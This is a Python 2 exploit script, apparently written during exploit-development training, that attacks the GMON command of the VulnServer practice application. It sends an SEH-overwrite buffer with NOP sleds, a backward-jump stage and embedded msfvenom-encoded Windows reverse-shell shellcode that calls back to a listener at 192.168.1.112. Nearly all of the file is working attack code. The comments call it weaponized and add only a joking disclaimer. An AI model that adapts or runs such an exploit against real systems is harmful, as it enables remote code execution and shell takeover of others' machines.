#!/usr/bin/python
#
# This python script is to be used for VulnServer 
# I created it during following CTP training
# If you are reading this, you either need help or enjoy
# my terrible humor. Either way, you are crazy ....
# Enjoy!
#
import socket
import os
import sys
import time
from struct import pack
#
# Six Arguments for all our VulnServer targets, including the script itself. 
# Down to two. The fuzz script became the attack script.
# Isn't that nice!
#
if len(sys.argv) != 3:
    #print "[-] Two arguments, really?\n"
    #print "[-] Apparently, so\n"
    print "[-] Usage: ./thisfile.py <ip> <port>\n" 
    print "[-] Example: ./thisfile.py 192.168.1.66 9999\n"
    #print "[-] Max size is the largest payload to be sent (200 bytes)\n"
    #print "[-] Interval is how much it will increase with each pass, starting from 1\n"
    #print "[-] So, in the example above, the fuzz will increase by 10 characters, until it crashes something or not!\n"
    print "[-] Try Harder!\n"
    sys.exit()

print "[-] Hello, looks like you survived the parameter quiz!\n"
print "[-] This script attacks the GMON parameter and sends a reverse shell to a specific machine / port\n"
print "[-] If you need to, you can just run the msfvenom command with your IP / PORT\n"
print "[-] WARNING! Educational disclaimer!\n"
print "[-] This weaponized script is for training and education only\n"
print "[-] If you get in trouble, it is your fault!, not mine\n"
print "[-] I will not bail you out of jail!\n"
time.sleep(2)
#
# Define the script arguments.
# 
ip = sys.argv[1]
port = int(sys.argv[2])
#
# Stage2 should take me somewhere in the first 2000 bytes, which will be 500 "A" and 1500 NOPS
# This was assembled in Immunity, then binary copied to here
#
stage2="\xE9\x8A\xF2\xFF\xFF"
#
#param = sys.argv[3]
size = 5000
#
# stage 3 payload
# venom command follows from Kali Linux.
# Target Windows Vista Home Basic SP2
#
#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.112 LPORT=19397 -b "\x00\x0a\x0d\x20" -e x86/shikata_ga_nai -f py EXITFUNC=seh
#[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
#[-] No arch selected, selecting arch: x86 from the payload
#Found 1 compatible encoders
#Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
#x86/shikata_ga_nai succeeded with size 351 (iteration=0)
#x86/shikata_ga_nai chosen with final size 351
#Payload size: 351 bytes
#Final size of py file: 1684 bytes
#
buf =  ""
buf += "\xba\x95\x54\x2c\xbe\xda\xcd\xd9\x74\x24\xf4\x58\x2b"
buf += "\xc9\xb1\x52\x83\xe8\xfc\x31\x50\x0e\x03\xc5\x5a\xce"
buf += "\x4b\x19\x8a\x8c\xb4\xe1\x4b\xf1\x3d\x04\x7a\x31\x59"
buf += "\x4d\x2d\x81\x29\x03\xc2\x6a\x7f\xb7\x51\x1e\xa8\xb8"
buf += "\xd2\x95\x8e\xf7\xe3\x86\xf3\x96\x67\xd5\x27\x78\x59"
buf += "\x16\x3a\x79\x9e\x4b\xb7\x2b\x77\x07\x6a\xdb\xfc\x5d"
buf += "\xb7\x50\x4e\x73\xbf\x85\x07\x72\xee\x18\x13\x2d\x30"
buf += "\x9b\xf0\x45\x79\x83\x15\x63\x33\x38\xed\x1f\xc2\xe8"
buf += "\x3f\xdf\x69\xd5\x8f\x12\x73\x12\x37\xcd\x06\x6a\x4b"
buf += "\x70\x11\xa9\x31\xae\x94\x29\x91\x25\x0e\x95\x23\xe9"
buf += "\xc9\x5e\x2f\x46\x9d\x38\x2c\x59\x72\x33\x48\xd2\x75"
buf += "\x93\xd8\xa0\x51\x37\x80\x73\xfb\x6e\x6c\xd5\x04\x70"
buf += "\xcf\x8a\xa0\xfb\xe2\xdf\xd8\xa6\x6a\x13\xd1\x58\x6b"
buf += "\x3b\x62\x2b\x59\xe4\xd8\xa3\xd1\x6d\xc7\x34\x15\x44"
buf += "\xbf\xaa\xe8\x67\xc0\xe3\x2e\x33\x90\x9b\x87\x3c\x7b"
buf += "\x5b\x27\xe9\x2c\x0b\x87\x42\x8d\xfb\x67\x33\x65\x11"
buf += "\x68\x6c\x95\x1a\xa2\x05\x3c\xe1\x25\xea\x69\xe8\xc5"
buf += "\x82\x6b\xea\x6e\x96\xe5\x0c\x1a\x08\xa0\x87\xb3\xb1"
buf += "\xe9\x53\x25\x3d\x24\x1e\x65\xb5\xcb\xdf\x28\x3e\xa1"
buf += "\xf3\xdd\xce\xfc\xa9\x48\xd0\x2a\xc5\x17\x43\xb1\x15"
buf += "\x51\x78\x6e\x42\x36\x4e\x67\x06\xaa\xe9\xd1\x34\x37"
buf += "\x6f\x19\xfc\xec\x4c\xa4\xfd\x61\xe8\x82\xed\xbf\xf1"
buf += "\x8e\x59\x10\xa4\x58\x37\xd6\x1e\x2b\xe1\x80\xcd\xe5"
buf += "\x65\x54\x3e\x36\xf3\x59\x6b\xc0\x1b\xeb\xc2\x95\x24"
buf += "\xc4\x82\x11\x5d\x38\x33\xdd\xb4\xf8\x4d\x2f\x04\x15"
buf += "\xd9\x96\xfd\x54\x87\x28\x28\x9a\xbe\xaa\xd8\x63\x45"
buf += "\xb2\xa9\x66\x01\x74\x42\x1b\x1a\x11\x64\x88\x1b\x30"
#
# Port, Size and interval (above) need to be expressed as integers
#
# Define the variable "crash"
#
# Divide the first half of the buffer in half (almost) so we can see better where we land
# This will aid when it is time to inject precise commands. Like Shellcode.
crash="A"*1900
crash+="\x90"*100
crash+=buf
crash+="\x90"*(1415-len(buf))
# 100 bytes of "front buffer" left"
# 50 NOPS to be safe
crash+="\x90"*50
# Then stage2, which should jump so far back Mr. Peabody will trip
#
crash+=stage2
# Then we have 50 minus the size of stage 2
# See below of python math policy
crash+="\x90"*(50-len(stage2))
# This overwrite work, then we have space for a quick jump 38 (hex) backwards.
# We should land in the land in the NOP SLED and stage2 shellcode section
crash+="\x90\x90\xeb\xb8\xbf\x11\x50\x62"
# Finish buffer length, let python do the math, you'll screw it up
crash+="D"*(size-3523)
#
buffer="GMON"
buffer+=" /.:/" # GMON needs this, I do not know if the other params do.
buffer+=crash + "\n"
#
print "[-] Here we going, sending evil buffer"
print "[-] Check listener for reverse shell!"
expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect((ip, port))
expl.send("HELP\n")
time.sleep(.25)
expl.send(buffer)
time.sleep(.25)
expl.send("EXIT\n")
expl.close
time.sleep(.5) # Why rush
#
print "[-] Done!\n"
#
exit()
